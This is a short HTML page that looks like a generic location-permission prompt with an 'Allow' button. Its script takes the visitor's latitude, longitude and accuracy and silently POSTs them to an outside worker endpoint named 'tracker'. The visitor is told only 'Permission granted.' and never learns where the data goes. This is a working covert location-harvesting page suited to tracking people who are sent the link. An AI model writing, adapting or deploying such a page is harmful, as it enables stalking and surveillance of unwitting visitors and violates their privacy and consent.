<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Location Permission</title>
</head>
<body>

<h2>Allow Location Access</h2>
<button onclick="getLocation()">Allow</button>

<p id="status"></p>

<script>
const WORKER_URL = "https://tracker.jovdat70.workers.dev/";

function getLocation() {
  if (!navigator.geolocation) {
    document.getElementById("status").innerText = "Geolocation not supported.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      // send numeric fields to match Worker
      fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat, lon, acc })
      }).then(() => {
        document.getElementById("status").innerText = "Permission granted.";
      }).catch(() => {
        document.getElementById("status").innerText = "Error sending location.";
      });
    },
    () => {
      document.getElementById("status").innerText = "Permission denied.";
    }
  );
}
</script>

</body>
</html>
